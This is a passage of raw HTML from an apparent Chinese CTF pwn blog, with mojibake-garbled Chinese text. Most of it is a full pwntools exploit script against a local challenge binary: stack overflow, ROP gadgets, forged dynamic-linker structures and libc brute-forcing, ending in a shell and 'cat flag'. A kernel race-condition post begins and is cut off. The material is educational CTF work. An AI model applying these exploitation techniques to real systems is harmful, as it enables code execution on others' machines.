ä¸ºElf64_Symç»“æ„ä½“çš„å¤§å°ä¸º24ï¼Œå¾—åˆ°writeçš„dynsymç´¢å¼•å·</span></span><br><span class="line"><span class="comment">#(4)ä¼ªé€ é‡å®šä½ç»“æ„+åŠ¨æ€é“¾æ¥ç»“æ„</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">32</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p64(fake_r_offset) + p64(r_info) + p64(<span class="number">0</span>)</span><br><span class="line">fake_sym = p32(<span class="number">0</span>) + p32(<span class="number">0x112</span>) + p64(fake_st_value) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)<span class="comment">#&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">payload2 += p64(p_rdi_ret)</span><br><span class="line">payload2 += p64(base_stage+<span class="number">0xc0</span>)   <span class="comment">#/bin/sh</span></span><br><span class="line">payload2 += p64(plt_1)</span><br><span class="line">payload2 += p64(fake_link_map)   <span class="comment">#</span></span><br><span class="line">payload2 += p64(index)       <span class="comment">#jmprel ä¸‹æ ‡å‚æ•°</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)       <span class="comment">#è¿”å›åœ°å€</span></span><br><span class="line"></span><br><span class="line">payload2 = payload2.ljust(index_offset-base_stage,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += fake_reloc <span class="comment"># index_offset(base_stage+7*8)çš„ä½ç½®</span></span><br><span class="line">payload2 = payload2.ljust(fake_sym_addr-base_stage,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += fake_sym   <span class="comment"># fake_sym_addr(base_stage+9*8)çš„ä½ç½®</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += p64(base_stage)</span><br><span class="line">payload2 = payload2.ljust(<span class="number">0xd0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line">sleep(wait_time)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¢åªæœ‰readæ—¶"   >
          <a href="#â‘¢åªæœ‰readæ—¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢åªæœ‰readæ—¶" class="headerlink" title="â‘¢åªæœ‰readæ—¶"></a>â‘¢åªæœ‰readæ—¶</h4>
      <p>è¿™ç§æƒ…å†µä¸€èˆ¬éœ€è¦çˆ†ç ´libcæ–‡ä»¶ï¼Œä½†æ˜¯éœ€è¦ä¸€ä¸ªåº“ï¼Œæ‰€ä»¥è¿˜å¾—è‡ªå·±å‡†å¤‡ä¸€ä¸ªæ¯”è¾ƒå®Œæ•´çš„libcæ–‡ä»¶åº“ï¼Œè¿™é‡Œè‡ªå·±å†™äº†ä¸€ä¸ªå·¥å…·ï¼Œä¸“é—¨ç”¨æ¥ä¾æ®libcæ–‡ä»¶åº“çˆ†ç ´ï¼Œç›´æ¥ç»™å‡ºä»£ç ï¼Œè¿™ä¸ªç­‰æˆ‘å•¥æ—¶å€™æœ‰æ—¶é—´è¯¦ç»†å®Œæˆä¸€ä¸‹è¿™ä¸ªå·¥å…·ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> myTool</span><br><span class="line"></span><br><span class="line"><span class="comment">#éœ€ä¿®æ”¹:æ–‡ä»¶åã€æº¢å‡ºåç§»ã€gadgetåœ°å€ã€å„èŠ‚åœ°å€</span></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line">fpath = <span class="string">&#x27;./bstack&#x27;</span></span><br><span class="line"></span><br><span class="line">offset_rbp = <span class="number">0x70</span></span><br><span class="line">length = <span class="number">0x100</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">leave_ret=<span class="number">0x00000000004006AB</span></span><br><span class="line">vuln_addr=<span class="number">0x400676</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(fpath)</span></span><br><span class="line"><span class="comment">#arch = &quot;x86-64&quot;/&quot;i386&quot;</span></span><br><span class="line">libc_list = myTool.getLibc(<span class="string">&quot;x86-64&quot;</span>,version=<span class="string">&quot;2.27&quot;</span>)</span><br><span class="line">libcAll_path = <span class="string">&#x27;/home/hacker/LibcSearcher/libc-database/libcAllSo/&#x27;</span></span><br><span class="line">elf = ELF(fpath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">u64Leakbase = <span class="keyword">lambda</span> offset :u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ] + <span class="string">&#x27;\0\0&#x27;</span>) - offset</span><br><span class="line">u32Leakbase = <span class="keyword">lambda</span> offset :u32(ru(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>: ]) - offset</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span>(<span class="params">string,addr</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;</span>%(string,addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdb_a</span>(<span class="params">addr</span>):</span></span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *&#123;0&#125; \n c&quot;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makecall</span>(<span class="params">p6_addr,call_addr,addr, rdi, rsi, rdx, tail = <span class="number">0</span></span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += p64(p6_addr)</span><br><span class="line">    payload += p64(<span class="number">0x0</span>)</span><br><span class="line">    payload += p64(<span class="number">0x1</span>)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(call_addr)</span><br><span class="line">    <span class="keyword">if</span> (tail):</span><br><span class="line">        payload += p64(<span class="number">0x0</span>) * <span class="number">7</span> + p64(tail)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#cat flag</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">regexp_out</span>(<span class="params">data</span>):</span></span><br><span class="line">    patterns = [</span><br><span class="line">        re.<span class="built_in">compile</span>(<span class="string">r&#x27;flag&#123;.*?&#125;&#x27;</span>),</span><br><span class="line">        re.<span class="built_in">compile</span>(<span class="string">r&#x27;xnuca&#123;(.*?)&#125;&#x27;</span>),</span><br><span class="line">        re.<span class="built_in">compile</span>(<span class="string">r&#x27;DASCTF&#123;(.*?)&#125;&#x27;</span>),</span><br><span class="line">        re.<span class="built_in">compile</span>(<span class="string">r&#x27;WMCTF&#123;.*?&#125;&#x27;</span>),</span><br><span class="line">        re.<span class="built_in">compile</span>(<span class="string">r&#x27;[0-9a-zA-Z]&#123;8&#125;-[0-9a-zA-Z]&#123;3&#125;-[0-9a-zA-Z]&#123;5&#125;&#x27;</span>),</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> patterns:</span><br><span class="line">        res = pattern.findall(data.decode() <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">bytes</span>) <span class="keyword">else</span> data)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(res) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(res[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">libcFile,one_gadget</span>):</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;./libc.so.6&quot;,checksec = False)</span></span><br><span class="line">    <span class="comment">#one_gadget = 0x4f432</span></span><br><span class="line"></span><br><span class="line">    libc = ELF(libcFile,checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    plt_0 = elf.get_section_by_name(<span class="string">&quot;.plt&quot;</span>)[<span class="string">&quot;sh_addr&quot;</span>]</span><br><span class="line">    p6_addr=elf.sym[<span class="string">&#x27;__libc_csu_init&#x27;</span>] + <span class="number">0x5a</span></span><br><span class="line">    call_addr=elf.sym[<span class="string">&#x27;__libc_csu_init&#x27;</span>] + <span class="number">0x40</span></span><br><span class="line">    p_rdi_ret=elf.sym[<span class="string">&#x27;__libc_csu_init&#x27;</span>] + <span class="number">0x63</span></span><br><span class="line">    p_rbp_ret=elf.sym[<span class="string">&#x27;register_tm_clones&#x27;</span>] + <span class="number">0x38</span></span><br><span class="line">    read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    got_8=elf.get_section_by_name(<span class="string">&#x27;.got.plt&#x27;</span>).header.sh_addr+<span class="number">8</span>   <span class="comment">#0x601008</span></span><br><span class="line">    bss_addr =elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">    libc_bss_addr = libc.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">    base_stage = bss_addr + stack_size</span><br><span class="line">    libc_start_main_addr = libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    fake_link_map=elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]    <span class="comment">#change!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span></span><br><span class="line">    fake_st_value=one_gadget-libc_start_main_addr    <span class="comment">#0x4526a   0xf02a4     0xf1147</span></span><br><span class="line">    fake_r_offset=libc_bss_addr-libc_start_main_addr</span><br><span class="line">    <span class="comment"># fake_st_value=0x4526a-0x20740    #0x4526a   0xf02a4     0xf1147</span></span><br><span class="line">    <span class="comment"># fake_r_offset=0x3c5720-0x20740</span></span><br><span class="line"></span><br><span class="line">    val_0x68=base_stage+<span class="number">0xc0</span>-<span class="number">8</span>    <span class="comment">#0x600ea8</span></span><br><span class="line">    val_0x70=base_stage+<span class="number">0xc0</span>-<span class="number">8</span>    <span class="comment">#0x600eb8</span></span><br><span class="line">    val_0xf8=base_stage+<span class="number">0xc0</span>-<span class="number">8</span>    <span class="comment">#0x600f28</span></span><br><span class="line">    wait_time=<span class="number">0.1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#print p.recv()        # &#x27;Welcome to XDCTF2015~!\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#1.å¾€fake_link_map+0x68å†™å€¼</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*offset_rbp</span><br><span class="line">    payload+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span></span><br><span class="line">    payload+=makecall(p6_addr,call_addr,read_got,<span class="number">0</span>,fake_link_map+<span class="number">0x68</span>,<span class="number">16</span>,tail=vuln_addr)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb_a(0x4006AA)</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    sleep(wait_time)</span><br><span class="line">    p.send(p64(val_0x68)+p64(val_0x70))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#2.å¾€fake_link_map+0xf8å†™å€¼</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*offset_rbp</span><br><span class="line">    payload+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span></span><br><span class="line">    payload+=makecall(p6_addr,call_addr,read_got,<span class="number">0</span>,fake_link_map+<span class="number">0xf8</span>,<span class="number">8</span>,tail=vuln_addr)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(wait_time)</span><br><span class="line">    p.send(p64(val_0xf8))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#3.å¾€base_stageå†™å…¥ä¼ªé€ ç»“æ„å¹¶è·³è¿‡å»</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*offset_rbp</span><br><span class="line">    payload+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span></span><br><span class="line">    payload+=makecall(p6_addr,call_addr,read_got,<span class="number">0</span>,base_stage,<span class="number">0xd0</span>,tail=<span class="number">0</span>)   <span class="comment">#å‡è®¾ç»“æ„å¤§å°æ˜¯400</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(base_stage)+p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">    payload+=p64(leave_ret)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#4.bssæ•°æ®ï¼šrop-å‚æ•°æ”¾åœ¨å¯„å­˜å™¨/ ä¼ªé€ ç»“æ„  </span></span><br><span class="line">    <span class="comment">#(1)ç¡®å®šå„ä¸ªèŠ‚çš„åœ°å€ </span></span><br><span class="line">    plt_1 = plt_0+<span class="number">6</span></span><br><span class="line">    <span class="comment">#(2)ç¡®å®šé‡å®šä½ä¸‹æ ‡</span></span><br><span class="line">    align = <span class="number">24</span> - (<span class="number">56</span> % <span class="number">24</span>)  <span class="comment"># è¿™é‡Œçš„å¯¹é½æ“ä½œæ˜¯å› ä¸ºdynsymé‡Œçš„ELF64_R_SYMç»“æ„ä½“éƒ½æ˜¯24å­—èŠ‚å¤§å°</span></span><br><span class="line">    index_offset = base_stage + <span class="number">7</span>*<span class="number">8</span> + align</span><br><span class="line">    index = (<span class="number">7</span>*<span class="number">8</span> + align) / <span class="number">24</span> <span class="comment"># base_stage + 7*8 æŒ‡å‘fake_relocï¼Œå‡å»rel_pltå³åç§»</span></span><br><span class="line">    <span class="comment">#(3)ç¡®å®šåŠ¨æ€é“¾æ¥ç¬¦å·ä¸‹æ ‡</span></span><br><span class="line">    align = <span class="number">24</span> - ((<span class="number">13</span>*<span class="number">8</span>) % <span class="number">24</span>)<span class="comment"># è¿™é‡Œçš„å¯¹é½æ“ä½œæ˜¯å› ä¸ºdynsymé‡Œçš„Elf64_Symç»“æ„ä½“éƒ½æ˜¯24å­—èŠ‚å¤§å°</span></span><br><span class="line">    fake_sym_addr = base_stage + <span class="number">13</span>*<span class="number">8</span> + align</span><br><span class="line">    index_dynsym = (<span class="number">13</span>*<span class="number">8</span> + align) / <span class="number">24</span> <span class="comment"># é™¤ä»¥24å› ä¸ºElf64_Symç»“æ„ä½“çš„å¤§å°ä¸º24ï¼Œå¾—åˆ°writeçš„dynsymç´¢å¼•å·</span></span><br><span class="line">    <span class="comment">#(4)ä¼ªé€ é‡å®šä½ç»“æ„+åŠ¨æ€é“¾æ¥ç»“æ„</span></span><br><span class="line">    r_info = (index_dynsym &lt;&lt; <span class="number">32</span>) | <span class="number">0x7</span></span><br><span class="line">    fake_reloc = p64(fake_r_offset) + p64(r_info) + p64(<span class="number">0</span>)</span><br><span class="line">    fake_sym = p32(<span class="number">0</span>) + p32(<span class="number">0x112</span>) + p64(fake_st_value) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    payload2 = p64(<span class="number">0</span>)<span class="comment">#&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">    payload2 += p64(p_rdi_ret)</span><br><span class="line">    payload2 += p64(base_stage+<span class="number">0xc0</span>)   <span class="comment">#/bin/sh</span></span><br><span class="line">    payload2 += p64(plt_1)</span><br><span class="line">    payload2 += p64(fake_link_map)   <span class="comment">#</span></span><br><span class="line">    payload2 += p64(index)       <span class="comment">#jmprel ä¸‹æ ‡å‚æ•°</span></span><br><span class="line">    payload2 += p64(<span class="number">0</span>)       <span class="comment">#è¿”å›åœ°å€</span></span><br><span class="line"></span><br><span class="line">    payload2 = payload2.ljust(index_offset-base_stage,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload2 += fake_reloc <span class="comment"># index_offset(base_stage+7*8)çš„ä½ç½®</span></span><br><span class="line">    payload2 = payload2.ljust(fake_sym_addr-base_stage,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload2 += fake_sym   <span class="comment"># fake_sym_addr(base_stage+9*8)çš„ä½ç½®</span></span><br><span class="line">    payload2 = payload2.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload2 += p64(base_stage)</span><br><span class="line">    payload2 = payload2.ljust(<span class="number">0xd0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.send(payload2)</span><br><span class="line">    sleep(wait_time)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#----getshell-----</span></span><br><span class="line">    <span class="comment">#no interactive</span></span><br><span class="line">    p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">        flag = p.recvuntil(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment">#continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        log.success(<span class="string">&#x27;flag: %s&#x27;</span>, regexp_out(flag))</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    log.info(<span class="string">&quot;Times:%d&quot;</span>%i)</span><br><span class="line">    <span class="keyword">for</span> libcFile <span class="keyword">in</span> libc_list:</span><br><span class="line">        libcFile = libcAll_path + libcFile</span><br><span class="line">        one_gadget_list = myTool.getOnegadget(libcFile)</span><br><span class="line">        <span class="keyword">for</span> one_gadget <span class="keyword">in</span> one_gadget_list:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p = process(fpath)</span><br><span class="line">                log.success(<span class="string">&#x27;libcFile: %s&#x27;</span>,libcFile)</span><br><span class="line">                <span class="comment">#print(one_gadget)</span></span><br><span class="line">                pwn(libcFile,one_gadget)</span><br><span class="line">                <span class="comment">#pwn()</span></span><br><span class="line">            <span class="keyword">except</span> EOFError:</span><br><span class="line">                p.close()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                p.close()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p.interactive()</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘£å¼€äº†æ²™ç®±ï¼Œåªæœ‰readå’Œlibcæ–‡ä»¶"   >
          <a href="#â‘£å¼€äº†æ²™ç®±ï¼Œåªæœ‰readå’Œlibcæ–‡ä»¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘£å¼€äº†æ²™ç®±ï¼Œåªæœ‰readå’Œlibcæ–‡ä»¶" class="headerlink" title="â‘£å¼€äº†æ²™ç®±ï¼Œåªæœ‰readå’Œlibcæ–‡ä»¶"></a>â‘£å¼€äº†æ²™ç®±ï¼Œåªæœ‰readå’Œlibcæ–‡ä»¶</h4>
      <p>è¿™ç§å°±å¾—ç”¨orwæ¥è¯»å–flagäº†æˆ–è€…ä½¿ç”¨æµ‹ä¿¡é“æ”»å‡»ï¼Œä¹‹åå†æ¥è¯¦ç»†å®Œæˆä¸€ä¸‹æŠŠã€‚</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zoepla.github.io/2018/08/%E6%A0%88%E6%BA%A2%E5%87%BA_%E4%BA%8C_-64%E4%BD%8D/" >æ ˆæº¢å‡º(64bit)çš„ä¸€äº›æ“ä½œ&lt;äºŒ&gt; (zoepla.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ğŸ”ºæœ‰æ—¶å€™ä¸‡èƒ½gadgetå¯èƒ½ä¸å¤ªä¸€æ ·</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211214220500.png" alt="image-20211214220500845"></p>
<p>rdiå’Œrdxçš„èµ‹å€¼é¡ºåºå¯èƒ½å‘ç”Ÿå˜åŒ–ï¼Œéœ€è¦æ³¨æ„</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/10/19/Kernel%E4%BB%8E0%E5%BC%80%E5%A7%8B(%E5%9B%9B)/">pwnKernelä»0å¼€å§‹(å››)</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-10-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-05-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="å‰è¨€"   >
          <a href="#å‰è¨€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1>
      <p>è¿™é‡Œå°è¯•å„ç§å„æ ·çš„éªšæ“ä½œè§£æ³•</p>

        <h1 id="ä¸€ã€å¤šçº¿ç¨‹çš„çœŸæ¡ä»¶ç«äº‰"   >
          <a href="#ä¸€ã€å¤šçº¿ç¨‹çš„çœŸæ¡ä»¶ç«äº‰" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€å¤šçº¿ç¨‹çš„çœŸæ¡ä»¶ç«äº‰" class="headerlink" title="ä¸€ã€å¤šçº¿ç¨‹çš„çœŸæ¡ä»¶ç«äº‰"></a>ä¸€ã€å¤šçº¿ç¨‹çš„çœŸæ¡ä»¶ç«äº‰</h1>
      
        <h2 id="1-ç®€å•çš„å¤šçº¿ç¨‹"   >
          <a href="#1-ç®€å•çš„å¤šçº¿ç¨‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ç®€å•çš„å¤šçº¿ç¨‹" class="headerlink" title="1.ç®€å•çš„å¤šçº¿ç¨‹"></a>1.ç®€å•çš„å¤šçº¿ç¨‹</h2>
      <p>å…ˆç»™å‡ºè‡ªå·±ç¼–å†™çš„é¢˜ç›®æºç ï¼Œå‚ç…§å¤šæ–¹é¢˜ç›®ï¼Œä¸»è¦è¿˜æ˜¯0CTF2018-baby</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 